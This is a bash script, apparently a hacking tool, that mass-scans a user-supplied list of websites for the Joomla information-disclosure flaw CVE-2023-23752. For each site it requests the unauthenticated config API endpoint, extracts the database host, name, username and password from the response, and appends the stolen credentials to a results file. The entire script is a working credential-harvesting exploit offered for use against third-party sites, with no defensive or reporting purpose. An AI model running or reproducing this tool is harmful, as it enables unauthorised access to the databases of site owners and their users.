#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

echo -e "$yellow ===================================================="
echo -e "$okegreen           Mass Scanner JOOMLA Config              "
echo -e "$okegreen                 CVE2023-23752                     "
echo -e "$okegreen              DigitalProject@2023                  "
echo -e "$yellow ===================================================="
echo -e "$red[*]$cyan important! don't use a slash at the end of your list"
echo -e "$red[*]$cyan Sample List: https://google.com (Not https://google.com/)$white"
read -p "Your list => " list;

scanbos(){
curl -sL "$domen/api/index.php/v1/config/application?public=true" -o joom.txt
if [[ $(cat joom.txt | grep -oP '"self"') =~ "self" ]];
then
   if [[ $(cat joom.txt | grep -oP 'user"') =~ "user" ]];
   then
     usernya=$(cat joom.txt | grep -oP 'user":"(.*?)"' | cut -d '"' -f3)
   else
     usernya=$(echo -e "$red Nope!$okegreen")
   fi
   
   if [[ $(cat joom.txt | grep -oP 'password"') =~ "password" ]];
   then
     passwordnya=$(cat joom.txt | grep -oP 'password":"(.*?)"' | cut -d '"' -f3)
   else
     passwordnya=$(echo -e "$red Nope!$okegreen")
   fi
   
   if [[ $(cat joom.txt | grep -oP 'host":"') =~ "host" ]];
   then
     hostnya=$(cat joom.txt | grep -oP 'host":"(.*?)"' | cut -d '"' -f3)
   else
     hostnya=$(echo -e "$red Nope!$okegreen")
   fi
   
   if [[ $(cat joom.txt | grep -oP 'db":"') =~ "db" ]];
   then
     dbnya=$(cat joom.txt | grep -oP 'db":"(.*?)"' | cut -d '"' -f3)
   else
     dbnya=$(echo -e "$red Nope!$okegreen")
   fi
   
   echo -e "$cyan[+]$yellow $domen $cyan=>$okegreen [$hostnya] [$dbnya] [$usernya] [$passwordnya]"
   echo "$domen => [$hostnya][$dbnya][$usernya][$passwordnya]" >> result.txt
   sed -i -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" result.txt
   rm -rf joom.txt
else
   echo -e "$cyan[+]$yellow $domen $cyan==>$red [Not Vuln]"
   rm -rf joom.txt
fi
}
for domen in $(cat $list);do
scanbos
done
